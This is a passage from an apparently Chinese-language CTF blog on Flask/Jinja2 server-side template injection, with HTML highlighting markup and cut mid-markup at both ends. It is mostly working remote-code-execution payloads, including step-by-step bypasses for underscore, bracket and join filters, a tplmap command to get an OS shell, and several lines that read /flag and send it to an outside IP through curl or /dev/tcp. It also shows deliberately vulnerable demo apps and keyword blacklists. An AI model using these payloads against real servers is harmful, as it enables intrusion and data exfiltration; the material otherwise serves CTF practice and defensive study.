class="hljs-title">__init__</span></span><span class="hljs-class"><span class="hljs-title">join</span></span><span class="hljs-class"><span class="hljs-title">__dict__</span></span><span class="hljs-class">[</span><span class="hljs-class">]</span><span class="hljs-class"><span class="hljs-title">ls</span></span><span class="hljs-class"><span class="hljs-title">_module</span></span><span class="hljs-class"><span class="hljs-title">__globals__</span></span><span class="hljs-class"><span class="hljs-title">__getattribute__</span></span><span class="hljs-class"><span class="hljs-title">__base__</span></span><span class="hljs-class"><span class="hljs-title">system</span></span><span class="hljs-class"><span class="hljs-title">popen</span></span><span class="hljs-class"><span class="hljs-title">exec</span></span><span class="hljs-class"><span class="hljs-title">read</span></span><span class="hljs-class"><span class="hljs-title">write</span></span><span class="hljs-class"><span class="hljs-title">timeit</span></span><span class="hljs-class"><span class="hljs-title">platform</span></span><span class="hljs-class"><span class="hljs-title">builtins</span></span><span class="hljs-class"><span class="hljs-title">compile</span></span><span class="hljs-class"><span class="hljs-title">session</span></span><span class="hljs-class"><span class="hljs-title">url_for</span></span><span class="hljs-class"><span class="hljs-title">application</span></span><span class="hljs-class"><span class="hljs-title">get_flashed_messages</span></span><span class="hljs-class"><span class="hljs-title">g</span></span><span class="hljs-class"><span class="hljs-title">__class__</span></span><span class="hljs-class"><span class="hljs-title">__mro__</span></span><span class="hljs-class">&#x27;&#x27;</span><span class="hljs-class">&quot;&quot;</span><span class="hljs-class">.</span><span class="hljs-class">()</span>&#123;&#125;linecache__builtins____subclasses__|<span class="hljs-built_in">format</span>|<span class="hljs-built_in">format</span>__request[requestargsvalue</code></pre></div># 例题## 简单测试<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> render_template<span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request<span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> render_template_stringapp = Flask(__name__)<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/test&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span>():</span>    template = <span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-string">        &lt;div class=&quot;center-content error&quot;&gt;</span><span class="hljs-string">            &lt;h1&gt;Oops! That page doesn&#x27;t exist.&lt;/h1&gt;</span><span class="hljs-string">            &lt;h3&gt;%s&lt;/h3&gt;</span><span class="hljs-string">        &lt;/div&gt; </span><span class="hljs-string">        </span><span class="hljs-string">    &#x27;&#x27;&#x27;</span> %(request.args.get(<span class="hljs-string">&#x27;k&#x27;</span>))    <span class="hljs-keyword">return</span> render_template_string(template)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    app.debug = <span class="hljs-literal">True</span>    app.run()</code></pre></div>这部分为简单的测试，k参数直接拼接进入模板。在实际利用时，我们可以更加高大上一些，直接拼接多个模板，同时进行注入。### 常规payload<div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/test?k=&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;/tmp/mytest1337.py&#x27;,&#x27;w&#x27;).write(request.headers[&#x27;X-Payload&#x27;])&#125;&#125;-&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;/tmp/mytest1337.py&#x27;).read()&#125;&#125;-&#123;&#123;config.from_pyfile(&#x27;/tmp/mytest1337.py&#x27;)&#125;&#125;</span> <span class="hljs-meta">HTTP/1.1</span><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.133.180:5000<span class="hljs-attribute">X-Payload</span><span class="hljs-punctuation">: </span>import os;a=os.system(&quot;cat /flag &gt; /tmp/mytest1337.log&quot;);os.system(&quot;curl http://129.211.9.7:9999/&#123;&#125;&quot;.format(open(&quot;/tmp/mytest1337.log&quot;).read().encode(&quot;hex&quot;)))<span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:79.0) Gecko/20100101 Firefox/79.0<span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<span class="hljs-attribute">Pragma</span><span class="hljs-punctuation">: </span>no-cache<span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>no-cache</code></pre></div>## **简单测试过滤**<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os <span class="hljs-comment">#We need that to facilitate the RCE. Otherwise one needs to run &#123;&#123;config.from_object(&quot;os&quot;)&#125;&#125; first.</span><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, render_template_string, requestapp = Flask(__name__)<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span>    exploit = request.args.get(<span class="hljs-string">&#x27;exploit&#x27;</span>)    <span class="hljs-built_in">print</span> exploit    rendered_template = render_template(<span class="hljs-string">&quot;app.html&quot;</span>, exploit=exploit)    print(rendered_template)    <span class="hljs-keyword">return</span> render_template_string(rendered_template)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:    app.run(debug=<span class="hljs-literal">True</span>)</code></pre></div>### level 1 过滤`_`<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os <span class="hljs-comment">#We need that to facilitate the RCE. Otherwise one needs to run &#123;&#123;config.from_object(&quot;os&quot;)&#125;&#125; first.</span><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, render_template_string, requestapp = Flask(__name__)<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span>    exploit = request.args.get(<span class="hljs-string">&#x27;exploit&#x27;</span>)    <span class="hljs-built_in">print</span> exploit    blacklist = [<span class="hljs-string">&quot;__class__&quot;</span>]    <span class="hljs-comment"># Level 1</span>    <span class="hljs-keyword">for</span> bad_string <span class="hljs-keyword">in</span> blacklist:        <span class="hljs-keyword">if</span> bad_string <span class="hljs-keyword">in</span> exploit:            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;HACK ATTEMPT &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(bad_string), <span class="hljs-number">400</span>    rendered_template = render_template(<span class="hljs-string">&quot;app.html&quot;</span>, exploit=exploit)    print(rendered_template)    <span class="hljs-keyword">return</span> render_template_string(rendered_template)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:    app.run(debug=<span class="hljs-literal">True</span>)</code></pre></div><div class="hljs code-wrapper"><pre><code class="hljs jinja2">http:&#x2F;&#x2F;192.168.133.180:5000&#x2F;test?k&#x3D;&#123;&#123;request|attr(request.args.param)&#125;&#125;&amp;param&#x3D;__class__</code></pre></div>### level 2 过滤`_、request[request.`<div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os <span class="hljs-comment">#We need that to facilitate the RCE. Otherwise one needs to run &#123;&#123;config.from_object(&quot;os&quot;)&#125;&#125; first.</span><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, render_template_string, requestapp = Flask(__name__)<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span>    exploit = request.args.get(<span class="hljs-string">&#x27;exploit&#x27;</span>)    <span class="hljs-built_in">print</span> exploit    blacklist = [<span class="hljs-string">&quot;__class__&quot;</span>, <span class="hljs-string">&quot;request[request.&quot;</span>]    blacklist += [<span class="hljs-string">&quot;__&quot;</span>]    <span class="hljs-comment"># Level 1</span>    <span class="hljs-keyword">for</span> bad_string <span class="hljs-keyword">in</span> blacklist:        <span class="hljs-keyword">if</span> bad_string <span class="hljs-keyword">in</span> exploit:            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;HACK ATTEMPT &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(bad_string), <span class="hljs-number">400</span>    <span class="hljs-comment"># Level 2</span>    <span class="hljs-keyword">for</span> bad_string <span class="hljs-keyword">in</span> blacklist:        <span class="hljs-keyword">for</span> param <span class="hljs-keyword">in</span> request.args:            <span class="hljs-keyword">if</span> bad_string <span class="hljs-keyword">in</span> request.args[param]:                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;HACK ATTEMPT &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(bad_string), <span class="hljs-number">400</span>    rendered_template = render_template(<span class="hljs-string">&quot;app.html&quot;</span>, exploit=exploit)    print(rendered_template)    <span class="hljs-keyword">return</span> render_template_string(rendered_template)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:    app.run(debug=<span class="hljs-literal">True</span>)</code></pre></div>上面的payload无法使用了,可以使用join进行字符串拼接<div class="hljs code-wrapper"><pre><code class="hljs jinja2">http:&#x2F;&#x2F;localhost:5000&#x2F;?exploit&#x3D;&#123;&#123;request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)&#125;&#125;&amp;class&#x3D;class&amp;usc&#x3D;_</code></pre></div>### level3 过滤了`[]、_、request[request.`join支持元组<div class="hljs code-wrapper"><pre><code class="hljs jinja2">http:&#x2F;&#x2F;localhost:5000&#x2F;?exploit&#x3D;&#123;&#123;request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)&#125;&#125;&amp;class&#x3D;class&amp;usc&#x3D;_</code></pre></div>但是，它有点丑陋且很长。使用该`.getlist()`函数，我们可以将其缩短一点：<div class="hljs code-wrapper"><pre><code class="hljs jinja2">http:&#x2F;&#x2F;localhost:5000&#x2F;?exploit&#x3D;&#123;&#123;request|attr(request.args.getlist(request.args.l)|join)&#125;&#125;&amp;l&#x3D;a&amp;a&#x3D;_&amp;a&#x3D;_&amp;a&#x3D;class&amp;a&#x3D;_&amp;a&#x3D;_</code></pre></div>### level 4 过滤了 `join`<div class="hljs code-wrapper"><pre><code class="hljs jinja2">http:&#x2F;&#x2F;localhost:5000&#x2F;?exploit&#x3D;&#123;&#123;request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))&#125;&#125;&amp;f&#x3D;%s%sclass%s%s&amp;a&#x3D;_</code></pre></div>### **level5 最终payload**首先是需要绕过获取object时使用的`[]`这里过滤了`_`，所以没法使用`__getitem__()`。但是我们可以使用jinja2的控制语句`&#123;%%&#125;</code>set 命令来获取第八个元素，这里使用a-i获取前九个元素，i即获取到第八个元素。也就是对应着我们的利用链。</li></ul><div class="hljs code-wrapper"><pre><code class="hljs jinja2">http:&#x2F;&#x2F;localhost:5000&#x2F;?exploit&#x3D;&#123;%set a,b,c,d,e,f,g,h,i%20&#x3D;%20request.__class__.__mro__%&#125;&#123;&#123;i.__subclasses__().pop(40)(request.args.file,request.args.write).write(request.args.payload)&#125;&#125;&#123;&#123;config.from_pyfile(request.args.file)&#125;&#125;&amp;file&#x3D;&#x2F;tmp&#x2F;foo.py&amp;write&#x3D;w&amp;payload&#x3D;print+1337</code></pre></div><p>但是这样的payload无法绕过<code>_</code></p><p><strong>最终payload：</strong></p><div class="hljs code-wrapper"><pre><code class="hljs jinja2">http:&#x2F;&#x2F;localhost:5000&#x2F;?exploit&#x3D;&#123;%set%20a,b,c,d,e,f,g,h,i%20&#x3D;%20request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.mro,request.args.usc*2)|join)%&#125;&#123;&#123;(i|attr((request.args.usc*2,request.args.subc,request.args.usc*2)|join)()).pop(40)(request.args.file,request.args.write).write(request.args.payload)&#125;&#125;&#123;&#123;config.from_pyfile(request.args.file)&#125;&#125;&amp;class&#x3D;class&amp;mro&#x3D;mro&amp;subc&#x3D;subclasses&amp;usc&#x3D;_&amp;file&#x3D;&#x2F;tmp&#x2F;foo.py&amp;write&#x3D;w&amp;payload&#x3D;print+1337</code></pre></div><p><strong>注意：</strong></p><p>环境的不同会导致获取object的序号不同，我本地的object为第10号元素，所以我需要赋值给11个变量：</p><div class="hljs code-wrapper"><pre><code class="hljs jinja2">&#123;%%20set%20a,b,c,d,e,f,g,h,i,j,k%20&#x3D;%20request.__class__.__mro__%&#125;</code></pre></div><p>不然会报错，真实场景下存在waf如果无法直接查看序号，可以多次尝试，正常返回200即运行正确。</p><div class="hljs code-wrapper"><pre><code class="hljs jinja2">&#123;%set%20a,b,c,d,e,f,g,h,i,j,k%20&#x3D;%20request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)|attr((request.args.usc*2,request.args.mro,request.args.usc*2)|join)%&#125;&#123;&#123;(k|attr((request.args.usc*2,request.args.subc,request.args.usc*2)|join)()).pop(40)(request.args.file,request.args.write).write(request.args.payload)&#125;&#125;&#123;&#123;config.from_pyfile(request.args.file)&#125;&#125;&amp;class&#x3D;class&amp;mro&#x3D;mro&amp;subc&#x3D;subclasses&amp;usc&#x3D;_&amp;file&#x3D;&#x2F;tmp&#x2F;foo.py&amp;write&#x3D;w&amp;payload&#x3D;import+os;a&#x3D;os.system(&quot;cat+&#x2F;flag+&gt;+&#x2F;tmp&#x2F;mytest1337.log&quot;);os.system(&quot;curl+http:&#x2F;&#x2F;129.211.9.7:9999&#x2F;&#123;&#125;&quot;.format(open(&quot;&#x2F;tmp&#x2F;mytest1337.log&quot;).read().encode(&quot;hex&quot;)))</code></pre></div><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20201001114304261.png" alt="image-20201001114304261"></p><h3 id="更多payload转换练习"><a href="#更多payload转换练习" class="headerlink" title="更多payload转换练习"></a>更多payload转换练习</h3><div class="hljs code-wrapper"><pre><code class="hljs jinja2">&#123;&#123;().__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).system(&quot;&#x2F;bin&#x2F;bash -c \&quot;cat &#x2F;flag &gt; &#x2F;dev&#x2F;tcp&#x2F;129.211.9.7&#x2F;9999\&quot;&quot;)&#39;)&#125;&#125;</code></pre></div><p>对应：</p><div class="hljs code-wrapper"><pre><code class="hljs jinja2">http:&#x2F;&#x2F;192.168.133.180:5000&#x2F;?exploit&#x3D;&#123;&#123;()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()|attr(request.args.x4)(59)|attr(request.args.x5)|attr(request.args.x6)|attr(request.args.x4)(request.args.x7)|attr(request.args.x4)(request.args.x8)(request.args.x9)&#125;&#125;&amp;x1&#x3D;__class__&amp;x2&#x3D;__base__&amp;x3&#x3D;__subclasses__&amp;x4&#x3D;__getitem__&amp;x5&#x3D;__init__&amp;x6&#x3D;__globals__&amp;x7&#x3D;__builtins__&amp;x8&#x3D;eval&amp;x9&#x3D;__import__(%22os%22).system(%22&#x2F;bin&#x2F;bash+-c+\%22cat+&#x2F;flag+%3E+&#x2F;dev&#x2F;tcp&#x2F;129.211.9.7&#x2F;9999\%22%22)</code></pre></div><div class="hljs code-wrapper"><pre><code class="hljs jinja2">&#123;&#123;().__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;).popen(&#39;whoami&#39;).read()&#125;&#125;对应http:&#x2F;&#x2F;192.168.133.180:5000&#x2F;?exploit&#x3D;&#123;&#123;()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()|attr(request.args.x4)(59)|attr(request.args.x5)|attr(request.args.x6)|attr(request.args.x4)(request.args.x7)|attr(request.args.x4)(request.args.x8)(request.args.x9)|attr(request.args.x10)(request.args.x11)|attr(request.args.x12)()&#125;&#125;&amp;x1&#x3D;__class__&amp;x2&#x3D;__base__&amp;x3&#x3D;__subclasses__&amp;x4&#x3D;__getitem__&amp;x5&#x3D;__init__&amp;x6&#x3D;__globals__&amp;x7&#x3D;__builtins__&amp;x8&#x3D;__import__&amp;x9&#x3D;os&amp;x10&#x3D;popen&amp;x11&#x3D;whoami&amp;x12&#x3D;read</code></pre></div><div class="hljs code-wrapper"><pre><code class="hljs jinja2">&#123;&#123;().__class__.__base__.__subclasses__()[59]()._module.__builtins__[&#39;__import__&#39;](&quot;os&quot;).system(&quot;whoami&quot;)&#125;&#125;&#123;&#123;()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()|attr(request.args.x4)http:&#x2F;&#x2F;192.168.133.180:5000&#x2F;?exploit&#x3D;&#123;&#123;()|attr(request.args.x1)|attr(request.args.x2)|attr(request.args.x3)()|attr(request.args.x4)(59)()|attr(request.args.x5)|attr(request.args.x6)|attr(request.args.x4)(request.args.x7)(request.args.x8)|attr(request.args.x9)(request.args.x10)&#125;&#125;&amp;x1&#x3D;__class__&amp;x2&#x3D;__base__&amp;x3&#x3D;__subclasses__&amp;x4&#x3D;__getitem__&amp;x5&#x3D;_module&amp;x6&#x3D;__builtins__&amp;x7&#x3D;__import__&amp;x8&#x3D;os&amp;x9&#x3D;system&amp;x10&#x3D;whoami(59)&#125;&#125;&amp;x1&#x3D;__class__&amp;x2&#x3D;__base__&amp;x3&#x3D;__subclasses__&amp;x4&#x3D;__getitem__&amp;x5&#x3D;</code></pre></div><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># linecache利用</span><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;linecache&#x27;</span>].__dict__[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;calc&#x27;</span>)<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;linecache&#x27;</span>].__dict__[<span class="hljs-string">&#x27;sys&#x27;</span>].modules[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;calc&#x27;</span>)<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;linecache&#x27;</span>].__dict__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;calc&#x27;</span>)<span class="hljs-comment"># __builtins__利用，包括__import__、file、open、execfile、eval、结合exec的compile等</span><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;calc&#x27;</span>)<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;sys&#x27;</span>).modules[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;whoami&#x27;</span>).read()<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;sys&#x27;</span>).modules[<span class="hljs-string">&#x27;platform&#x27;</span>].popen(<span class="hljs-string">&#x27;whoami&#x27;</span>).read()<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;file&#x27;</span>](<span class="hljs-string">&#x27;E:/passwd&#x27;</span>).read()<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;open&#x27;</span>](<span class="hljs-string">&#x27;E:/test.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>).write(<span class="hljs-string">&#x27;hello&#x27;</span>)<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;execfile&#x27;</span>](<span class="hljs-string">&#x27;E:/exp.py&#x27;</span>)<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;eval&#x27;</span>](<span class="hljs-string">&#x27;__import__(&quot;os&quot;).system(&quot;calc&quot;)&#x27;</span>)exec(<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;compile&#x27;</span>](<span class="hljs-string">&#x27;__import__(&quot;os&quot;).system(&quot;calc&quot;)&#x27;</span>, <span class="hljs-string">&#x27;&lt;string&gt;&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>))<span class="hljs-comment"># sys利用</span><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;sys&#x27;</span>].modules[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;calc&#x27;</span>)<span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;sys&#x27;</span>].modules[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;whoami&#x27;</span>).read()<span class="hljs-comment"># types利用，后面还是通过__builtins__实现利用</span><span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[<span class="hljs-string">&#x27;types&#x27;</span>].__dict__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;calc&#x27;</span>)</code></pre></div><p>字典用<code>|attr(__getitem__(request.args.x??))</code></p><h2 id="逃逸1"><a href="#逃逸1" class="headerlink" title="逃逸1"></a>逃逸1</h2><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> __future__ <span class="hljs-keyword">import</span> print_functionbanned = [    <span class="hljs-string">&quot;import&quot;</span>,    <span class="hljs-string">&quot;exec&quot;</span>,    <span class="hljs-string">&quot;eval&quot;</span>,    <span class="hljs-string">&quot;pickle&quot;</span>,    <span class="hljs-string">&quot;os&quot;</span>,    <span class="hljs-string">&quot;subprocess&quot;</span>,    <span class="hljs-string">&quot;kevin sucks&quot;</span>,    <span class="hljs-string">&quot;input&quot;</span>,    <span class="hljs-string">&quot;banned&quot;</span>,    <span class="hljs-string">&quot;cry sum more&quot;</span>,    <span class="hljs-string">&quot;sys&quot;</span>]targets = __builtins__.__dict__.keys()targets.remove(<span class="hljs-string">&#x27;raw_input&#x27;</span>)targets.remove(<span class="hljs-string">&#x27;print&#x27;</span>)<span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> targets:    <span class="hljs-keyword">del</span> __builtins__.__dict__[x]<span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:    print(<span class="hljs-string">&quot;&gt;&gt;&gt;&quot;</span>, end=<span class="hljs-string">&#x27; &#x27;</span>)    data = raw_input()    <span class="hljs-keyword">for</span> no <span class="hljs-keyword">in</span> banned:        <span class="hljs-keyword">if</span> no.lower() <span class="hljs-keyword">in</span> data.lower():            print(<span class="hljs-string">&quot;No bueno&quot;</span>)            <span class="hljs-keyword">break</span>    <span class="hljs-keyword">else</span>: <span class="hljs-comment"># this means nobreak</span>        <span class="hljs-built_in">exec</span> data</code></pre></div><h2 id="SSTI1-巅峰极客2020"><a href="#SSTI1-巅峰极客2020" class="headerlink" title="SSTI1 巅峰极客2020"></a>SSTI1 巅峰极客2020</h2><div class="hljs code-wrapper"><pre><code class="hljs jinja2">&#123;&#123;request|attr(&#39;application&#39;)|attr(&#39;\x5f\x5fglobals\x5f\x5f&#39;)|attr(&#39;\x5f\x5fgetitem\x5f\x5f&#39;)(&#39;\x5f\x5fbuiltins\x5f\x5f&#39;)|attr(&#39;\x5f\x5fgetitem\x5f\x5f&#39;)(&#39;\x5f\x5fimport\x5f\x5f&#39;)(&#39;os&#39;)|attr(&#39;popen&#39;)(&#39;cat &#x2F;flag&#39;)|attr(&#39;read&#39;)()&#125;&#125;</code></pre></div><p>过滤<code>|join、_、[]</code>等可以采用的方式</p><p>payload原型为：</p><div class="hljs code-wrapper"><pre><code class="hljs jinja2">&#123;&#123;request.application.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&#125;&#125;&#123;&#123;request[&#39;application&#39;][&#39;__globals__&#39;][&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;os&#39;)[&#39;popen&#39;](&#39;id&#39;)[&#39;read&#39;]()&#125;&#125;</code></pre></div><h2 id="buuctf-fake-google"><a href="#buuctf-fake-google" class="headerlink" title="buuctf fake google"></a>buuctf fake google</h2><div class="hljs code-wrapper"><pre><code class="hljs clojure">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;</span>) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre></div><p>得到Flag：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/5592bae9d0e9df9ea83c14fde0b48873a20.png" alt="img"></p><p>除此之外第二种更简单的解法就是用tplmap工具直接GetShell。</p><p>python tplmap.py -u <a href="http://078120db-2672-4fc5-b3a9-87e76e4d9773.node3.buuoj.cn/qaq?name=">http://078120db-2672-4fc5-b3a9-87e76e4d9773.node3.buuoj.cn/qaq?name=</a> –os-shell</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/7f153f9a4b2c99751f45462885bf36a3981.png" alt="img"></p><p>然后cat /flag也可以得到Flag：</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/473884af2001ff2b566de9675ee59e8380a.png" alt="img"></p><p><strong>tplmap 的payload</strong></p><div class="hljs code-wrapper"><pre><code class="hljs jinja2">&#123;&#123;7251761135&#125;&#125;&#123;&#123;&#39;&#39;&#125;&#125;&#123;% set d &#x3D; &quot;eval(__import__(&#39;base64&#39;).urlsafe_b64decode(&#39;X19pbXBvcnRfXygnb3MnKS5wb3BlbihfX2ltcG9ydF9fKCdiYXNlNjQnKS51cmxzYWZlX2I2NGRlY29kZSgnYkhNPScpLmRlY29kZSgpKS5yZWFkKCk&#x3D;&#39;))&quot; %&#125;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125; &#123;% if c.__name__ &#x3D;&#x3D; &#39;catch_warnings&#39; %&#125;&#123;% for b in c.__init__.__globals__.values() %&#125; &#123;% if b.__class__ &#x3D;&#x3D; &#123;&#125;.__class__ %&#125;&#123;% if &#39;eval&#39; in b.keys() %&#125;&#123;&#123; b[&#39;eval&#39;](d) &#125;&#125;&#123;% endif %&#125; &#123;% endif %&#125; &#123;% endfor %&#125;&#123;% endif %&#125; &#123;% endfor %&#125;&#123;&#123;&#39;&#39;&#125;&#125;&#123;&#123;6201548481&#125;&#125;</code></pre></div><h2 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="WesternCTF2018 shrine"></a>WesternCTF2018 shrine</h2><p>题目源码</p><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> flask<span class="hljs-keyword">import</span> osapp = flask.Flask(__name__)app.config[<span class="hljs-string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span 